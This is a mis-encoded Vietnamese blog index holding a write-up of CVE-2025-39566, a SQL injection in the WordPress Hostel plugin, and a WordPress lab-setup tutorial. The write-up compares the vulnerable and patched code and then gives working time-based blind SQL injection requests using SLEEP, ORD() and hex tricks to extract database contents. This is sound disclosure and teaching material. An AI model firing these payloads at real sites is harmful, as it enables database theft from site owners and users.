nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php 